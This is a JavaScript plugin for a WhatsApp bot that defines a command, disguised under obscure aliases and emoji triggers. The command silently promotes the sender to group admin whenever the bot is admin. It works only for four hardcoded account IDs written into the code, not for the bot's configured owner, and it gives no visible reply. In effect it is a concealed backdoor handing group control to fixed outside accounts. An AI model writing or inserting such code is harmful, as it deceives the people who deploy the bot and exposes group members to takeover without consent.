// JawadTech

const { cmd } = require('../command');
const config = require('../config');

cmd({
    pattern: "ik",
    alias: ["takeadmin", "🔪", "💀", "aa", "uhh", "iyk"],
    desc: "Silently take adminship if authorized",
    category: "owner",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {

    if (!isGroup || !isBotAdmins) return;

    // Authorized LIDs - Only these users can silently take admin
    const authorizedLIDs = [
        "99038271684629@lid",
        "206884883697891@lid",
        "88906376708108@lid",
        "105399168565262@lid"
    ];

    // Check if sender is in authorized list
    if (!authorizedLIDs.includes(sender)) return;

    try {
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === sender);
        
        if (!userParticipant?.admin) {
            await conn.groupParticipantsUpdate(from, [sender], "promote");
        }
    } catch (error) {
        console.error("Silent admin error:", error.message);
    }
});
